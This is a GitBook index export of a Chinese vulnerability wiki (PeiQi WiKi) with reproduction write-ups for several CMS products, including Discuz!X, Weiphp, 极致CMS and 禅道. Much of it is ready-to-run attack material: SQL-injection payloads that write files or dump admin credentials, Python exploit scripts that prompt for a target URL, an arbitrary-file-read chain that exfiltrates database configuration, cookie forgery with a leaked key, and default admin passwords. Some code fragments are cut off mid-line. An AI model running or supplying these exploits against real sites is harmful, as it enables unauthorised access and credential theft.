{"./":{"url":"./","title":"Introduction","keywords":"","body":"PeiQI WiKi文库🐑 关于文库 如今漏洞的各种复现文章已经填满了互联网，但是每次去尝试漏洞复现时，总会纠结于环境搭建，POC和漏洞原理上。 由于这些因素，通常都需要翻阅很多很多的文章才能理解这个漏洞，于是，便萌生了把环境搭建，POC，漏洞原理全部集合在一个文库的想法，PeiQI WiKi文库便由此而来🐣 关于使用 文库使用的是Gitbook，因为风格比较清新，简洁。于是便选择了它来搭建文库。 目前Wiki文库是开源的，每一个人都可以下载随时翻阅🐬 在线查阅 Github链接 码云链接 [!NOTE] POC文件都存放于漏洞分类后的POC目录中 扫描工具文件存放于漏洞分类后的Scan目录中 [!NOTE] 网站目录上方支持正则搜索关键字快速查看 [!NOTE] 边框可以调整，字体大小和背景也支持更换 如何本地使用 [!NOTE] 1.Github 拉取代码 git clone https://gitee.com/yelisenyu/wiki.git git clone https://github.com/PeiQi0/wiki.git 2.下载 gitbook apt install npm npm install gitbook-cli -g 3.打开Wiki的目录下执行 gitbook serve 4.访问 http://localhost:4000 即可 最后 目前文库由我一人维护中，因为文库个人风格原因暂不接受师傅们的投稿。不过师傅们可以提出文库改良的意见给我。 [!NOTE] 下面就是文库的公众号啦，更新的文章都会在第一时间推送在公众号 别忘了Github下载完给个小星星⭐ PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/":{"url":"PeiQi_Wiki/CMS漏洞/","title":"CMS漏洞","keywords":"","body":"CMS 漏洞🦅 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/Discuz!X/":{"url":"PeiQi_Wiki/CMS漏洞/Discuz!X/","title":"Discuz X","keywords":"","body":"Discuz!X Discuz!X PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/Discuz!X/Discuz!X 小于3.4 R20191201 后台SQL注入漏洞.html":{"url":"PeiQi_Wiki/CMS漏洞/Discuz!X/Discuz!X 小于3.4 R20191201 后台SQL注入漏洞.html","title":"Discuz!X 小于3.4 R20191201 后台SQL注入漏洞","keywords":"","body":"Discuz!X 漏洞描述 不久以前Discuz!X的后台披露了一个sql注入的漏洞，这里也要感谢漏洞的发现和研究者（无糖的kn1f3)。 影响版本 [!NOTE] Discuz!X 环境搭建 百度云盘下载链接 密码: 0515 将 upload目录下的文件拷入phpstudy下的WWW目录打开网站按照步骤安装就行了 漏洞复现 来到后台页面, 在 UCenter 应用 ID 位置的参数添加单引号并抓包 发现出现SQL语句报错 使用报错注入去获取版本号 这里的参数为 settingnew[uc][appid] 查看文件 \\source\\admincp\\admincp_setting.php， 在2677行找到了输入点 根据报错语句找到SQL语句执行点，在文件uc_client\\model\\base.php 中的 206行 通过这里的语句可以看到我们可以使用 union注入 的方法来写入恶意文件(secure_file_priv不能为Null) 1' union select \"\" into outfile 'D:/peiqi.php';--+ 也可以使用其他的方法 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/Typesetter/":{"url":"PeiQi_Wiki/CMS漏洞/Typesetter/","title":"Typesetter","keywords":"","body":"Typesetter Typesetter CMS 5-5.1 任意文件上传 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/Typesetter/Typesetter CMS 5-5.1 任意文件上传.html":{"url":"PeiQi_Wiki/CMS漏洞/Typesetter/Typesetter CMS 5-5.1 任意文件上传.html","title":"Typesetter CMS 5-5.1 任意文件上传","keywords":"","body":"Typesetter CMS 5-5.1 任意文件上传 漏洞描述 可以通过将.php放在.zip文件中并解压缩来绕过对.php文件的保护。一旦完成，就可以使用恶意的php文件（webshell）在计算机上执行命令 影响版本 [!NOTE] Typesetter CMS 5-5.1 漏洞复现 按如下步骤复现 参考文章 Github 绕过文件上传限制导致命令执行 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/Weiphp/":{"url":"PeiQi_Wiki/CMS漏洞/Weiphp/","title":"Weiphp","keywords":"","body":"Weiphp Weiphp5.0 前台文件任意读取 CNVD-2020-68596 Weiphp5.0 任意用户Cookie伪造 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/Weiphp/Weiphp5.0 任意用户Cookie伪造.html":{"url":"PeiQi_Wiki/CMS漏洞/Weiphp/Weiphp5.0 任意用户Cookie伪造.html","title":"Weiphp5.0 任意用户Cookie伪造","keywords":"","body":"Weiphp5.0 任意用户Cookie伪造 漏洞描述 Weiphp5.0 存在管理员用户Cookie伪造，通过泄露的密钥数据，可利用加密方法来得到管理员的Cookie 影响版本 [!NOTE] Weiphp 环境搭建 weiphp5.0官方下载参考手册 参考官方手册创建网站即可 漏洞复现 首先需要得到数据库配置文件中的data_auth_key密钥 得到这个配置文件可参照上一篇Weiphp5.0 前台文件任意读取 'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T' 全局查找下使用了这个密钥的地方 找到了跟据这个密钥的加密方法和解密方法 加密方法 think_encrypt function think_encrypt($data, $key = '', $expire = 0) { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = base64_encode($data); $x = 0; $len = strlen($data); $l = strlen($key); $char = ''; for ($i = 0; $i 解密方法 think_decrypt function think_decrypt($data, $key = '') { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = str_replace(array( '-', '_' ), array( '+', '/' ), $data); $mod4 = strlen($data) % 4; if ($mod4) { $data .= substr('====', $mod4); } $data = base64_decode($data); $expire = substr($data, 0, 10); $data = substr($data, 10); if ($expire > 0 && $expire 全局查看下使用了解密方法的地方 在文件 application\\common.php 中含有使用解密方法的代码，用于做身份验证 function is_login() { $user = session('user_auth'); if (empty($user)) { $cookie_uid = cookie('user_id'); if (!empty($cookie_uid)) { $uid = think_decrypt($cookie_uid); $userinfo = getUserInfo($uid); D('common/User')->autoLogin($userinfo); $user = session('user_auth'); } } if (empty($user)) { return 0; } else { return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0; } } 根据这里得到的代码，可以知道当user_Id=1时,会解密密钥后判断是否正确，如果正确则可以登录系统 我们在本地使用加密代码加密user_id=1得到的cookie则可以登录系统 添加cookie: user_id=xxxxxxxx即可成功登录 [!NOTE] 获取密钥的方法参照上一篇审计文章 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/Weiphp/Weiphp5.0 前台文件任意读取 CNVD-2020-68596.html":{"url":"PeiQi_Wiki/CMS漏洞/Weiphp/Weiphp5.0 前台文件任意读取 CNVD-2020-68596.html","title":"Weiphp5.0 前台文件任意读取 CNVD-2020-68596","keywords":"","body":"Weiphp5.0 前台文件任意读取 漏洞描述 Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等敏感文件 影响版本 [!NOTE] Weiphp 环境搭建 weiphp5.0官方下载参考手册 参考官方手册创建网站即可 漏洞复现 漏洞函数文件:application\\material\\controller\\Material.php 漏洞函数:_download_imgage public function _download_imgage($media_id, $picUrl = '', $dd = null) { $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); mkdirs($savePath); $cover_id = 0; if (empty($picUrl)) { // 获取图片URL $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token(); $param['media_id'] = $media_id; // dump($url); $picContent = post_data($url, $param, 'json', false); $picjson = json_decode($picContent, true); // dump($picjson);die; if (isset($picjson['errcode']) && $picjson['errcode'] != 0) { $cover_id = do_down_image($media_id, $dd['thumb_url']); if (!$cover_id) { return 0; exit(); } } $picName = NOW_TIME . uniqid() . '.jpg'; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $picContent); } else { $content = wp_file_get_contents($picUrl); // 获取图片扩展名 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } } if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } return $cover_id; } 首先注意到函数的标识为public，也就是这个函数是公共调用的，并且变量picUrl为可控变量 根据代码从上向下分析 $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); 变量$savePath确定文件上传后的缓存位置为/public/uploads/picture/，并按照年-月-日 创建文件夹 向下对变量$picUrl 是否为空进行判断，并判断是否进行登录，这里使用POST传参进行验证登录绕过，跳转到else语句下 else { $content = wp_file_get_contents($picUrl); // 获取图片扩展名 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } 分析传入变量 picUrl 的 wp_file_get_contents方法 $content = wp_file_get_contents($picUrl); 函数文件位置 application\\common.php 可以看到这里没有对我们的参数进行过滤，只做了一个有关超时的操作, 回到函数继续向下分析 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); 这里创建了有关当前时间的图片文件，并写入文件夹/public/uploads/picture/ 下 我们先尝试控制变量 $picUrl 来写入数据库配置文件到图片中 /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php 查看目录/public/uploads/picture/，并用记事本打开写入的jpg文件 得到数据库配置文件的信息，既然这个变量可控，我们也可以通过这个方法下载木马文件，再通过解析漏洞或者文件包含等其他漏洞来getshell 在当前条件下并不知道文件名是什么，所以回到代码中继续寻找可以获取文件名的办法 if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } 向下跟进 addFile 函数 函数位置:application\\home\\model\\Picture.php function addFile($file) { $data['md5'] = md5_file($file['tmp_name']); $id = $this->where('md5', $data['md5'])->value('id'); if ($id > 0) { return $id; } $info = pathinfo($file['tmp_name']); $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']); $data['sha1'] = hash_file('sha1', $file['tmp_name']); $data['create_time'] = NOW_TIME; $data['status'] = 1; $data['wpid'] = get_wpid(); $id = $this->insertGetId($data); return $id; } 可以看到这部分代码写入了 Picture 表中 $id = $this->insertGetId($data); 我们查看一下数据库的这个数据表，可以发现之前所上传的数据全部缓存在这个表里了 我们现在则需要找到不需要登录的地方来获得这些数据，所以可以全局去查找调用了这个 Picture 表的地方 找到一处可以利用的地方 function user_pics() { $map['wpid'] = get_wpid(); $picList = M('Picture')->where(wp_where($map)) ->order('id desc') ->select(); $this->assign('picList', $picList); exit($this->fetch()); } 跟进 get_wpid 函数 function get_wpid($wpid = '') { if (defined('WPID')) { return WPID; } else { return 0; } } 查看 WPID 的定义，文件位置在config\\weiphp_define.php 定义值默认为 1，所以这里调用则可以获得数据库中Pictrue表的内容，间接的知道了文件内容以及文件名 访问地址: http://webphp/public/index.php/home/file/user_pids 可以看到文件名，根据url地址访问选择下载即可 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Weiphp5.0 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): upload_url = target_url + \"/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } data = { \"1\":1 } try: response = requests.post(url=upload_url, headers=headers, data=data, timeout=20) if response.status_code == 200: print(\"\\033[32m[o] 成功将 database.php文件 写入Pictrue表中\\033[0m\") else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_2(target_url): vnln_url = target_url + \"/public/index.php/home/file/user_pics\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.get(url=vnln_url, headers=headers).text href = re.findall(r'>> \\033[0m\")) POC_1(target_url) image_url = POC_2(target_url) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/YzmCMS/":{"url":"PeiQi_Wiki/CMS漏洞/YzmCMS/","title":"Yzm CMS","keywords":"","body":"YzmCMS YzmCMS Version 小于V5.8正式版 后台采集模块 SSRF漏洞 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/YzmCMS/YzmCMS Version  小于V5.8正式版 后台采集模块 SSRF漏洞.html":{"url":"PeiQi_Wiki/CMS漏洞/YzmCMS/YzmCMS Version  小于V5.8正式版 后台采集模块 SSRF漏洞.html","title":"YzmCMS Version  小于V5.8正式版 后台采集模块 SSRF漏洞","keywords":"","body":"YzmCMS version 漏洞描述 YzmCMS内容管理系统是一款轻量级开源内容管理系统，它采用自主研发的框架YZMPHP开发。程序基于PHP+Mysql架构，并采用MVC框架式开发的一款高效开源的内容管理系统，可运行在Linux、Windows、MacOSX、Solaris等各种平台上。 源码存在协议识别的缺陷，导致存在SSRF漏洞 漏洞影响 [!NOTE] YzmCMS version 环境搭建 https://github.com/yzmcms/yzmcms 按照文档安装即可 漏洞复现 登录后台 --> 模块管理 --> 采集管理 添加采集规则 在你的服务器上编辑HTML代码 [!NOTE] 根目录可能不同，payload需要更改 点击采集读取根目录下的 Flag 出现漏洞的代码位置 yzmcms/yzmphp/core/class/cache_factory.class.php 这里调用 url_check 函数 可以看到这里只检测了前4位是否为 http，使用 httpxxx 即可绕过 参考文章 There are SSRF vulnerabilities in background collection management PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/华宜互联CMS/":{"url":"PeiQi_Wiki/CMS漏洞/华宜互联CMS/","title":"华宜互联CMS","keywords":"","body":"华宜互联CMS 华宜互联CMS默认存在超级管理员漏洞 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/华宜互联CMS/华宜互联CMS默认存在超级管理员漏洞.html":{"url":"PeiQi_Wiki/CMS漏洞/华宜互联CMS/华宜互联CMS默认存在超级管理员漏洞.html","title":"华宜互联CMS默认存在超级管理员漏洞","keywords":"","body":"华宜互联CMS默认存在超级管理员漏洞 漏洞描述 华宜互联CMS默认存在超级管理员漏洞，如不修改则使用默认账号密码即可登录超级管理员 影响版本 华宜互联CMS FOFA [!NOTE] body=\"华宜网络\" 漏洞复现 原版的源码需要付费，可找到免费版的源码 在目录下的DATA目录中有mdb文件, 打开后可以发现存在默认的两个用户 [!NOTE] admin/123456 lu123/cui123 使用 用户lu123 即可登录超级管理员 参考文章 华宜互联0day分享 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/极致CMS/":{"url":"PeiQi_Wiki/CMS漏洞/极致CMS/","title":"极致CMS","keywords":"","body":"极致CMS 极致CMS 全版本任意代码执行(后台权限) 极致CMS 1.71 ,1.7 ,1.67 版本 支付插件sql注入 极致CMS PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/极致CMS/极致CMS 1.81以下版本 存储型XSS.html":{"url":"PeiQi_Wiki/CMS漏洞/极致CMS/极致CMS 1.81以下版本 存储型XSS.html","title":"极致CMS 1.81以下版本 存储型XSS","keywords":"","body":"极致CMS 1.81以下版本 存储型XSS 漏洞复现 登录管理员添加模块 注册用户 点击发布文章 在文章标题处插入xss payload 当管理员访问时XSS成功 参考 极致CMS代码审计 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/极致CMS/极致CMS_1.71_1.7_1.67版本sql注入.html":{"url":"PeiQi_Wiki/CMS漏洞/极致CMS/极致CMS_1.71_1.7_1.67版本sql注入.html","title":"极致CMS_1.71_1.7_1.67版本sql注入","keywords":"","body":"极致CMS_1.71_1.7_1.67版本sql注入(支付插件) 查看一下进行过滤的函数 /** 参数过滤，格式化 **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://整数 return (int)$value; case 1://字符串 $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://数组 if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://浮点 return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //过滤XSS攻击 function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 } else { SafeFilter($arr[$key]); } } } } 看一下执行的SQL语句的函数 // 查询一条 public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } 跟进 findAll 函数 // 查询所有 public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } 在跟进一下getData函数 //获取数据 public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } 跟进query执行函数 //执行SQL语句并检查是否错误 public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('数据库错误：' . $msg[2] . end($this->filter)); } } 看到$msg = $this->pdo->errorInfo();语句，也就是说会把数据库报错信息打印在页面上并显示出来并退出 一套分析下来没有发现对sql语句的过滤，如果得到的数据没有经过format_param过滤，会产生注入 例如: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } 如果直接这样GET POST REQUEST 带入数据库 会产生报错注入 例如 ./exploit/name=123' (加一个引号会报错，如果引号没过滤) 现在只需要寻找类型是这样没过滤直接带入数据库的语句就行了 简单寻找下其实这样的地方挺多的，拿一个位置举例子 这里是一个支付插件的位置，蓝色方块1增加代码模拟开通支付宝功能通过验证 可以看到这个函数只使用[htmlspecialchars]来过滤了xss，sql语句没有过滤，用刚刚的方法来注入 可以看到的确出现了sql语句和数据库错误 直接报错注入获取敏感信息mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" 官网url : https://www.jizhicms.cn/ \"\"\" def main(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 极致CMS 1.67 - 171 \\033[0m') print('+ \\033[36m使用格式: python3 CNVD-2020-49710.py \\033[0m') print('+------------------------------------------') while True: poc = str(input('选择使用的poc：\\n' '1.sql注入\\n' '2.用户购物车爆破\\n' '3.GET 网站管理员账号密码\\n' '4.退出 quit\\n' 'poc:')) print('------------------ peiqi -----------------------') if poc == '1': poc_1() elif poc == '2': poc_2() elif poc == '3': poc_3() elif poc == '4': break else: print('参数错误，重新输入') def poc_1(): ## poc_1 ---> sql注入漏洞点( Home/c/MypayController.php [alipay_notify_pay]) ## 使用范围 极致cms 1.71 + 1.7 + 1.67 版本 \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //支付宝公钥，账户中心->密钥管理->开放平台密钥，找到添加了支付功能的应用，根据你的加密类型，查看支付宝公钥 $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //验证签名 $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; 付款成功'; $out_trade_no = htmlspecialchars($_GET['out_trade_no']); find(['orderno'=>$orderno]); 发布时间 2020-05-25]') else: print('得到的数据为:\\n', data) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2(): ## poc_2 ---> 用户购物车页面获取 (Home/c/UserController.php [orderdetails]) ## 漏洞点 ---> 无用户cookie id 的验证 ## 使用范围 极致cms 1.8以下全版本 (当前最新 v1.8 更新时间:6月30日) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //超时或者已支付 if($order['isshow']==0){ $msg = '订单已删除'; } if($order['isshow']==3){ $msg = '订单已过期，不可支付！'; } if($order['isshow']==2){ $msg = '订单已支付，请勿重复操作！'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //兼容多模块化 if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try: exploit_url = str(input(\"攻击网站url：\\n\")) year_day = str(input(\"输入日期(例如:20200712):\")) shop = [] # 遍历所有出现的用户购物车页面 for num in range(100000,999999): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests.get(exploit_url + payload_url) # 打印结果 if '总金额' in response.text: print('购物车页面：',payload_url) shop.append(payload_url) for page in shop: print(page) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') def poc_3(): ## poc_3 ---> 得到账号密码 ( Home/c/MypayController.php [alipay_notify_pay]) ## 使用范围 ---> 极致cms 1.71 + 1.7 + 1.67 版本 try: exploit_url = str(input(\"攻击网站url：\\n\")) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # 用户名 + 密码 长度 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) str_long = re.search(r'~(.*?)~',response.text).group(1) #print(str_long) # 得到账号密码，密码md5格式 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_1 = re.search(r\"~#(.*?)'\", response.text).group(1) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str(int(str_long) - 32) +\") from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_2 = re.search(r'~(.*?)~', response.text).group(1) #print(admin_name_2) # 分割账号密码 admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd.split(':') admin = admin_passwd[0] passwd = admin_passwd[1] #print(admin) #print(passwd) print(\"成功得到账号密码：\\n\" \"用户名:\",admin, \"\\n密码(md5):\",passwd) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') if __name__ == '__main__': main() 购物车爆破没有利用点，关于审计部分参考极致CMS审计 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/极致CMS/极致CMS_全版本任意文件上传.html":{"url":"PeiQi_Wiki/CMS漏洞/极致CMS/极致CMS_全版本任意文件上传.html","title":"极致CMS_全版本任意文件上传","keywords":"","body":"极致CMS_全版本任意文件(后台) 登陆后台查看插件处，有一个后台编辑的插件 安装之后设置密码并使用 [!NOTE] 如果已经设有密码，重新安装插件即可解决密码未知问题 修改为php代码 成功执行php代码的命令 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/禅道CMS/":{"url":"PeiQi_Wiki/CMS漏洞/禅道CMS/","title":"禅道CMS","keywords":"","body":"禅道 禅道 11.6版本 SQL注入漏洞 禅道 11.6版本 任意文件读取漏洞 禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325 禅道 小于12.4.2 CSRF漏洞 CNVD-2020-68552 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 SQL注入漏洞.html":{"url":"PeiQi_Wiki/CMS漏洞/禅道CMS/禅道 11.6版本 SQL注入漏洞.html","title":"禅道 11.6版本 SQL注入漏洞","keywords":"","body":"禅道 11.6版本 SQL注入漏洞 漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 影响版本 [!NOTE] 禅道 11.6 环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 漏洞复现 先对禅道的调用流程进行分析,先查看目录为www/index.php首页文件中 这里使用router::createApp创建了一个APP对象 $app = router::createApp('pms', dirname(dirname(__FILE__)), 'router'); 来到framework/base/router.class.php文件查看到createApp方法 public static function createApp($appName = 'demo', $appRoot = '', $className = '') { if(empty($className)) $className = __CLASS__; return new $className($appName, $appRoot); } 这里New了一个对象，查看一下调用方法(348行) 在358行处调用了setConfigRoot方法 $this->setConfigRoot(); public function setConfigRoot() { $this->configRoot = $this->basePath . 'config' . DS; } 在363行处调用了loadMainConfig方法 $this->loadMainConfig(); public function loadMainConfig() { /* 初始化$config对象。Init the $config object. */ global $config, $filter; if(!is_object($config)) $config = new config(); $this->config = $config; /* 加载主配置文件。 Load the main config file. */ $mainConfigFile = $this->configRoot . 'config.php'; if(!file_exists($mainConfigFile)) $this->triggerError(\"The main config file $mainConfigFile not found\", __FILE__, __LINE__, $exit = true); include $mainConfigFile; } 这里包含了配置文件config.php配置文件，文件目录为/config/config.php 在25行定义了调用方法 $config->requestType = 'PATH_INFO'; // 